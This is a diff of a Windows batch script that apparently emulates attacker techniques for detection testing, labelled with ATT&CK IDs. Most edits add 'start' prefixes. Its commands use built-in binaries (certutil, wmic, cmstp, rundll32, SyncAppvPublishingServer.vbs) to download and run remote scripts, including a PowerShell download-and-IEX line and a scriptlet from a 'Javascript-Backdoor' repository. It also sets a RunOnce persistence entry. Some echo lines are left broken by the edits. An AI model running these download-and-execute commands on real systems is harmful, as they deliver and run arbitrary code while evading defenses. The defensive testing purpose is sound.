@@ -114,24 +114,24 @@ echo         ^<Exec Command="calc.exe"/^>   >> xxxFile.csproj
 echo     ^</Target^>   >> xxxFile.csproj
 echo ^</Project^>   >> xxxFile.csproj
 
-C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj
+start "" C:\Windows\Microsoft.Net\Framework\v4.0.30319\MSBuild.exe xxxFile.csproj
 
 echo "[+] T1047 - Testing wmic download"
 
-wmic process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
+start "" wmic process get brief /format:"https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"
 
 echo "[+] T1191 - Testing cmstp download"
 
-cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf     
+start "" cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf     
 
 echo "[+] TXXXX - Testing diskshadow exec"
 
 echo exec calc.exe > diskshadow.txt
-diskshadow.exe /s diskshadow.txt  
+start "" diskshadow.exe /s diskshadow.txt  
 
 echo "[+] TXXXX - Testing Esentutl.exe download"
 
-esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o  
+start "" esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d adrestore.exe /o  
 start "" adrestore.exe   
 
 echo "[+] TXXXX - Testing replace.exe download"
@@ -139,17 +139,17 @@ echo "[+] TXXXX - Testing replace.exe download"
 replace \\live.sysinternals.com\tools\adrestore.exe adrestore2.exe /A
 start "" adrestore2.exe   
 
-echo "[+] TXXXX - Testing SyncAppvPublishingServer.vbs download & exec"
-
-C:\Windows\System32\SyncAppvPublishingServer.vbs "n;(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
+echo "[+] TXXXX - Testing SyncAppvPublishingServer.vbs download & 
+start "" C:\Windows\System32\SyncAppvPublishingServer.vbs "n;(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))"
 
 echo "[+] TXXXX - Testing HH.exe download"
 
-HH.exe http://bit.ly/L3g1tCrad1e
+start "" HH.exe http://bit.ly/L3g1tCrad1e
 
-echo "[+] TXXXX - Testing ieexec.exe download & execute"
+echo "[+] TXXXX - Testing ieexec.exe download & execute"exec"
+
 REM - this is faulty case. Need .EXE file hosted ...
-ieexec.exe https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp_calc.sct
+start "" ieexec.exe https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp_calc.sct
 
 echo "[+] T1128 - Testing netsh.exe dll exec"
 
@@ -161,7 +161,7 @@ netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
 netsh trace stop
 
 echo "[+] T1085 - Testing rundll32 execution"
-rundll32 AllTheThings.dll,EntryPoint
+start "" rundll32 AllTheThings.dll,EntryPoint
 
 echo "[+] T1085 - Testing rundll32 download & exec"
 start "" rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")
@@ -185,17 +185,17 @@ echo AddReg = CalcStart >> calc.inf
 echo [CalcStart]
 echo HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe /c """calc.exe""" >> calc.inf
 
-rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
+start "" rundll32 setupapi,InstallHinfSection DefaultInstall 132 calc.inf
 
 echo "[+] TXXXX - Testing Shdocvw exec via rundll32"
 
 echo [InternetShortcut] > C:\windows\temp\url.url
 echo URL=file:///c:\windows\system32\calc.exe >> C:\windows\temp\url.url
-rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
+start "" rundll32.exe shdocvw.dll, OpenURL C:\windows\temp\url.url
 
 echo "[+] T1130 - Testing certutil download and exec"
 
-certutil.exe -urlcache -split -f http://bit.ly/L3g1tCrad1e Default_File_Path2.ps1  
+start "" certutil.exe -urlcache -split -f http://bit.ly/L3g1tCrad1e Default_File_Path2.ps1  
 
 
 echo [+] Cleanup
